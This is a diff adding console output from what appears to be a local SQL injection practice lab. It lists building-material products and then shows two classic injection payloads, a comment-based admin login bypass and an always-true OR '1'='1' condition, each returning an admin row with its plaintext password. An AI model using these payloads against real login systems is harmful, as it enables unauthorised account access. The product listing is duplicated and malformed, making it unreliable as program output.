@@ -102,3 +102,87 @@ PS C:\Users\Awesome\OneDrive\Desktop\nyondo-sql-lab> node queries.js
   description: 'Portland cement 50kg bag',
   price: 38000
 }
+
+VULNERABLE.JS
+  id: 1,{
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 38000
+  },
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 3,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  {
+    id: 4,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 5,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  },
+  {
+    id: 6,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 35000
+  },
+  {
+    id: 7,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 8,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  {
+    id: 9,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 10,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  }
+
+ {
+    id: 9,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 10,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  }
+
+
+--- Attack 2: Login Bypass (No Password) ---
+Query: SELECT * FROM users WHERE username='admin'--' AND password='anything'
+Result: { id: 1, username: 'admin', password: 'admin123', role: 'admin' } 
+
+--- Attack 3: Always True Login ---
+Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+Result: { id: 1, username: 'admin', password: 'admin123', role: 'admin' } 
+
